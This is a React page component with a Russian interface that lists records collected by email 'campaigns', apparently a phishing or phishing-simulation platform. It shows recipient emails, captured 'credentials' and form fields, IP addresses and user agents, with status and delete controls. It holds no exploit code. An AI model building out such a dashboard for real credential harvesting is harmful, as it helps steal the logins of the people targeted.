import { useState } from "react";
import { useQuery, useMutation } from "@tanstack/react-query";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Skeleton } from "@/components/ui/skeleton";
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter, DialogClose } from "@/components/ui/dialog";
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle } from "@/components/ui/alert-dialog";
import { Search, Mail, MousePointerClick, FormInput, AlertCircle, MoreHorizontal, Eye, Check, Flag, Trash2 } from "lucide-react";
import { queryClient, apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { format } from "date-fns";
import { ru } from "date-fns/locale";
import type { CollectedData, Campaign } from "@shared/schema";

const dataTypeLabels = {
  credentials: "Учётные данные",
  "form-data": "Данные формы",
  "survey-response": "Ответ опроса",
};

const statusConfig = {
  pending: { label: "Ожидает", variant: "secondary" as const },
  verified: { label: "Проверено", variant: "default" as const },
  flagged: { label: "Помечено", variant: "destructive" as const },
};

export default function Responses() {
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedData, setSelectedData] = useState<CollectedData | null>(null);
  const [deleteConfirmId, setDeleteConfirmId] = useState<string | null>(null);
  const { toast } = useToast();

  const { data: collectedData, isLoading } = useQuery<CollectedData[]>({
    queryKey: ["/api/collected-data"],
  });

  const { data: campaigns } = useQuery<Campaign[]>({
    queryKey: ["/api/campaigns"],
  });

  const updateStatusMutation = useMutation({
    mutationFn: ({ id, status }: { id: string; status: string }) =>
      apiRequest(`/api/collected-data/${id}/status`, { 
        method: "PATCH", 
        body: JSON.stringify({ status }) 
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/collected-data"] });
      toast({ title: "Статус обновлён" });
    },
  });

  const deleteMutation = useMutation({
    mutationFn: (id: string) => apiRequest(`/api/collected-data/${id}`, { method: "DELETE" }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["/api/collected-data"] });
      toast({ title: "Запись удалена" });
    },
  });

  const getCampaignName = (campaignId: string) => {
    return campaigns?.find(c => c.id === campaignId)?.name || "Неизвестная кампания";
  };

  const filteredData = collectedData?.filter((entry) => {
    const campaignName = getCampaignName(entry.campaignId);
    return (
      entry.recipientEmail.toLowerCase().includes(searchQuery.toLowerCase()) ||
      campaignName.toLowerCase().includes(searchQuery.toLowerCase())
    );
  }) || [];

  const getStats = () => {
    if (!collectedData) return { total: 0, pending: 0, verified: 0, flagged: 0 };
    return {
      total: collectedData.length,
      pending: collectedData.filter(d => d.status === "pending").length,
      verified: collectedData.filter(d => d.status === "verified").length,
      flagged: collectedData.filter(d => d.status === "flagged").length,
    };
  };

  const stats = getStats();

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-semibold text-foreground" data-testid="text-page-title">Отклики и данные</h1>
        <p className="text-muted-foreground mt-1">Отслеживание собранной информации из кампаний</p>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2 gap-2">
            <CardTitle className="text-sm font-medium">Всего записей</CardTitle>
            <FormInput className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-8 w-20" />
            ) : (
              <div className="text-2xl font-bold" data-testid="stat-total">{stats.total}</div>
            )}
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2 gap-2">
            <CardTitle className="text-sm font-medium">Ожидают проверки</CardTitle>
            <Mail className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-8 w-20" />
            ) : (
              <div className="text-2xl font-bold" data-testid="stat-pending">{stats.pending}</div>
            )}
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2 gap-2">
            <CardTitle className="text-sm font-medium">Проверено</CardTitle>
            <MousePointerClick className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-8 w-20" />
            ) : (
              <div className="text-2xl font-bold" data-testid="stat-verified">{stats.verified}</div>
            )}
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2 gap-2">
            <CardTitle className="text-sm font-medium">Помечено</CardTitle>
            <AlertCircle className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-8 w-20" />
            ) : (
              <div className="text-2xl font-bold" data-testid="stat-flagged">{stats.flagged}</div>
            )}
          </CardContent>
        </Card>
      </div>

      <div className="relative max-w-sm">
        <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
        <Input
          placeholder="Поиск по email, кампании..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          className="pl-10"
          data-testid="input-search-responses"
        />
      </div>

      <Tabs defaultValue="all" className="space-y-4">
        <TabsList>
          <TabsTrigger value="all" data-testid="tab-all">Все</TabsTrigger>
          <TabsTrigger value="pending" data-testid="tab-pending">Ожидают</TabsTrigger>
          <TabsTrigger value="verified" data-testid="tab-verified">Проверенные</TabsTrigger>
          <TabsTrigger value="flagged" data-testid="tab-flagged">Помеченные</TabsTrigger>
        </TabsList>

        <TabsContent value="all">
          <DataTable 
            data={filteredData} 
            getCampaignName={getCampaignName}
            onView={setSelectedData}
            onUpdateStatus={(id, status) => updateStatusMutation.mutate({ id, status })}
            onDelete={setDeleteConfirmId}
            isLoading={isLoading}
          />
        </TabsContent>

        <TabsContent value="pending">
          <DataTable 
            data={filteredData.filter(d => d.status === "pending")} 
            getCampaignName={getCampaignName}
            onView={setSelectedData}
            onUpdateStatus={(id, status) => updateStatusMutation.mutate({ id, status })}
            onDelete={setDeleteConfirmId}
            isLoading={isLoading}
          />
        </TabsContent>

        <TabsContent value="verified">
          <DataTable 
            data={filteredData.filter(d => d.status === "verified")} 
            getCampaignName={getCampaignName}
            onView={setSelectedData}
            onUpdateStatus={(id, status) => updateStatusMutation.mutate({ id, status })}
            onDelete={setDeleteConfirmId}
            isLoading={isLoading}
          />
        </TabsContent>

        <TabsContent value="flagged">
          <DataTable 
            data={filteredData.filter(d => d.status === "flagged")} 
            getCampaignName={getCampaignName}
            onView={setSelectedData}
            onUpdateStatus={(id, status) => updateStatusMutation.mutate({ id, status })}
            onDelete={setDeleteConfirmId}
            isLoading={isLoading}
          />
        </TabsContent>
      </Tabs>

      <AlertDialog open={!!deleteConfirmId} onOpenChange={() => setDeleteConfirmId(null)}>
        <AlertDialogContent>
          <AlertDialogHeader>
            <AlertDialogTitle>Подтвердите удаление</AlertDialogTitle>
            <AlertDialogDescription>
              Вы уверены, что хотите удалить эту запись? Это действие нельзя отменить.
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>Отмена</AlertDialogCancel>
            <AlertDialogAction
              onClick={() => {
                if (deleteConfirmId) {
                  deleteMutation.mutate(deleteConfirmId);
                  setDeleteConfirmId(null);
                }
              }}
              className="bg-destructive text-destructive-foreground hover-elevate"
            >
              Удалить
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>

      <Dialog open={!!selectedData} onOpenChange={() => setSelectedData(null)}>
        <DialogContent className="max-w-lg">
          <DialogHeader>
            <DialogTitle>Детали записи</DialogTitle>
          </DialogHeader>
          {selectedData && (
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <p className="text-sm text-muted-foreground">Email</p>
                  <p className="font-medium">{selectedData.recipientEmail}</p>
                </div>
                <div>
                  <p className="text-sm text-muted-foreground">Тип</p>
                  <Badge variant="outline">{dataTypeLabels[selectedData.dataType]}</Badge>
                </div>
              </div>
              <div>
                <p className="text-sm text-muted-foreground mb-2">Собранные данные</p>
                <div className="bg-muted rounded-lg p-3 space-y-2">
                  {Object.entries(selectedData.collectedFields as Record<string, string>).map(([key, value]) => (
                    <div key={key} className="flex justify-between">
                      <span className="text-sm font-medium">{key}:</span>
                      <span className="text-sm text-muted-foreground">{value}</span>
                    </div>
                  ))}
                </div>
              </div>
              {selectedData.ipAddress && (
                <div>
                  <p className="text-sm text-muted-foreground">IP адрес</p>
                  <p className="font-mono text-sm">{selectedData.ipAddress}</p>
                </div>
              )}
              {selectedData.userAgent && (
                <div>
                  <p className="text-sm text-muted-foreground">User Agent</p>
                  <p className="text-sm truncate">{selectedData.userAgent}</p>
                </div>
              )}
            </div>
          )}
          <DialogFooter>
            <DialogClose asChild>
              <Button variant="outline">Закрыть</Button>
            </DialogClose>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  );
}

function DataTable({
  data,
  getCampaignName,
  onView,
  onUpdateStatus,
  onDelete,
  isLoading,
}: {
  data: CollectedData[];
  getCampaignName: (id: string) => string;
  onView: (data: CollectedData) => void;
  onUpdateStatus: (id: string, status: string) => void;
  onDelete: (id: string) => void;
  isLoading: boolean;
}) {
  if (isLoading) {
    return (
      <Card>
        <CardContent className="pt-6">
          <div className="space-y-3">
            {[1, 2, 3].map(i => <Skeleton key={i} className="h-16 w-full" />)}
          </div>
        </CardContent>
      </Card>
    );
  }

  if (data.length === 0) {
    return (
      <Card>
        <CardContent className="flex flex-col items-center justify-center py-12">
          <FormInput className="w-12 h-12 text-muted-foreground mb-4" />
          <p className="text-muted-foreground">Нет данных</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <Card>
      <CardContent className="pt-6">
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>Email</TableHead>
              <TableHead>Кампания</TableHead>
              <TableHead>Тип</TableHead>
              <TableHead>Статус</TableHead>
              <TableHead>Дата</TableHead>
              <TableHead className="w-[50px]"></TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {data.map((entry) => {
              const status = statusConfig[entry.status];
              return (
                <TableRow key={entry.id} data-testid={`row-data-${entry.id}`}>
                  <TableCell>
                    <p className="font-medium">{entry.recipientEmail}</p>
                  </TableCell>
                  <TableCell>
                    <p className="text-sm">{getCampaignName(entry.campaignId)}</p>
                  </TableCell>
                  <TableCell>
                    <Badge variant="outline">{dataTypeLabels[entry.dataType]}</Badge>
                  </TableCell>
                  <TableCell>
                    <Badge variant={status.variant}>{status.label}</Badge>
                  </TableCell>
                  <TableCell>
                    {format(new Date(entry.createdAt), "d MMM yyyy HH:mm", { locale: ru })}
                  </TableCell>
                  <TableCell>
                    <DropdownMenu>
                      <DropdownMenuTrigger asChild>
                        <Button variant="ghost" size="icon">
                          <MoreHorizontal className="w-4 h-4" />
                        </Button>
                      </DropdownMenuTrigger>
                      <DropdownMenuContent align="end">
                        <DropdownMenuItem onClick={() => onView(entry)}>
                          <Eye className="w-4 h-4 mr-2" />
                          Просмотр
                        </DropdownMenuItem>
                        <DropdownMenuItem onClick={() => onUpdateStatus(entry.id, "verified")}>
                          <Check className="w-4 h-4 mr-2" />
                          Отметить проверенным
                        </DropdownMenuItem>
                        <DropdownMenuItem onClick={() => onUpdateStatus(entry.id, "flagged")}>
                          <Flag className="w-4 h-4 mr-2" />
                          Пометить
                        </DropdownMenuItem>
                        <DropdownMenuItem onClick={() => onDelete(entry.id)} className="text-destructive">
                          <Trash2 className="w-4 h-4 mr-2" />
                          Удалить
                        </DropdownMenuItem>
                      </DropdownMenuContent>
                    </DropdownMenu>
                  </TableCell>
                </TableRow>
              );
            })}
          </TableBody>
        </Table>
      </CardContent>
    </Card>
  );
}
